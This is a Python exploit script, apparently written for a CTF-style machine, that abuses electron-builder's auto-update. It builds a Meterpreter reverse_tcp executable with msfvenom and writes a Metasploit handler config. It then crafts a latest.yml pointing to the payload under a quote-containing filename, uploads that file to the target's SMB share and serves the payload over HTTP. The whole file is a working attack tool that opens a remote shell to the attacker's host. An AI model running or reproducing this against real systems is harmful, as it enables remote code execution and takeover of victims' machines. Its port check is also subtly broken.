#!/usr/bin/python3

import os
import subprocess
import sys

banner = """
___________.__                 __                      __________.__                  __                
\_   _____/|  |   ____   _____/  |________  ____   ____\______   \  |  __ __  _______/  |_  ___________ 
 |    __)_ |  | _/ __ \_/ ___\   __\_  __ \/  _ \ /    \|    |  _/  | |  |  \/  ___/\   __\/ __ \_  __ '
 |        \|  |_\  ___/\  \___|  |  |  | \(  <_> )   |  \    |   \  |_|  |  /\___ \  |  | \  ___/|  | \/
/_______  /|____/\___  >\___  >__|  |__|   \____/|___|  /______  /____/____//____  > |__|  \___  >__|   
        \/           \/     \/                        \/       \/                \/            \/       
"""


if len(sys.argv) != 3:
    print("[!]Need More Arguments!!!!!")
    print("[+]Usage: ./electron_buster.py <lhost> <lport>")
    sys.exit()

else:
    print(banner)
    print("<electron_builder exploit>")

lhost = sys.argv[1]
lport = sys.argv[2]


metasploit_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o \"r'exploit.exe\""

if os.getuid() != 0:

    metasploit_cmd = "sudo "+metasploit_cmd

key_cmd = "shasum -a 512 \"r'exploit.exe\" | cut -d \" \" -f1 | xxd -r -p | base64 -w 0"

os.system(metasploit_cmd)
key = subprocess.getoutput(key_cmd)

os.system("touch config.rc")

f = open("config.rc","w")

f.write("use exploit/multi/handler\n")
f.write("set payload windows/meterpreter/reverse_tcp\n")
f.write(f"set LHOST {lhost}\n")
f.write(f"set LPORT {lport}\n")
f.write("run")
f.close()

print("[+]Open other terminal and put below Command")

if os.getuid() == 0:

    print("-> msfconsole -r config.rc\n\n")

else:

    print("->sudo msfconsole -r config.rc\n\n")


standby = input("press any key... ")

print("[*]Make latest.yml for exploit")
print("[+]Server UP for upload latest.yml so Enter the port for server")
server_port = input("> ")

allow_range = [p for p in range(1,65536)]

if server_port in allow_range:
    print("[+]Valid value, so Set it")

else:
    print("[!]Invalid Value: <allow_range: 1-65535>")
    print("[+]Set -> 8000")
    server_port = "8000"

os.system("touch latest.yml")
f = open("latest.yml","w")

f.write("version: 1.2.3\n")
f.write(f"path: http://{lhost}:{server_port}/r'exploit.exe\n")
f.write(f"sha512: {key}")
f.close()

print("[+]Enter Info of Targets:")
print("[+]Enter TargetHost and Path <example: 10.10.15.26/vulnerable>")
target_path = input("> ")
print("[+]Enter Directory")
print("Example: ")

ex_graph = """

+----------------------------------------------------------------------------+
|smb: \>                                                                     |
|    .                                   D        0  Mon May  8 00:22:48 2020|
|    ..                                  D        0  Mon May  8 00:22:48 2020|
|    client1                             D        0  Mon May  8 00:22:48 2020|
| +--client2                             D        0  Mon May  8 00:22:48 2020|
| |  client3                             D        0  Mon May  8 00:22:48 2020|
+----------------------------------------------------------------------------+
  |
  +-------> client2
"""


print(ex_graph)
directory = input("> ")

os.system(f"smbclient //{target_path}/ -U \" \"%\" \" -c \"cd {directory};put latest.yml\"")
os.system(f"python3 -m http.server {server_port}")

